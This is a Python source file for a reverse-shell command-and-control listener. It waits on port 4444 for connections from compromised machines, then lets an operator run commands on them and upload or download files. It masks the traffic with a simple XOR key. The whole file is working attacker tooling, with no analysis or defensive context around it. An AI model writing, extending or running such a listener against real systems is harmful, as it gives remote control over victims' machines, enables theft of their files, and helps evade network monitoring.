import socket
import threading

XOR_KEY = 0x5A

def xor(data):
    return bytes([b ^ XOR_KEY for b in data])

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")

    try:
        while True:
            cmd = input("Shell> ")
            if cmd.strip() == "":
                continue

            # Upload file
            if cmd.startswith("upload "):
                conn.send(xor((cmd + "\n").encode()))
                filename = cmd.split(" ", 1)[1]
                try:
                    with open(filename, "rb") as f:
                        while chunk := f.read(1024):
                            conn.send(xor(chunk))
                    conn.send(xor(b"ENDFILE"))
                except FileNotFoundError:
                    print("[-] File not found.")

            # Download file
            elif cmd.startswith("download "):
                conn.send(xor((cmd + "\n").encode()))
                with open(cmd.split(" ", 1)[1], "wb") as f:
                    while True:
                        data = conn.recv(1024)
                        decrypted = xor(data)
                        if b"ENDFILE" in decrypted:
                            f.write(decrypted.replace(b"ENDFILE", b""))
                            print("[+] Download complete.")
                            break
                        elif b"ERROR: File not found" in decrypted:
                            print(decrypted.decode())
                            break
                        else:
                            f.write(decrypted)

            # Run command
            else:
                conn.send(xor((cmd + "\n").encode()))
                try:
                    conn.settimeout(1.0)
                    while True:
                        data = conn.recv(1024)
                        if not data:
                            break
                        print(xor(data).decode('utf-8', errors='ignore'), end="")
                except socket.timeout:
                    pass

    except Exception as e:
        print(f"[-] Connection error: {e}")
    finally:
        conn.close()
        print("[-] Disconnected.")

def start_listener(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"[*] Listening on {host}:{port} ...")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()

if __name__ == "__main__":
    start_listener()
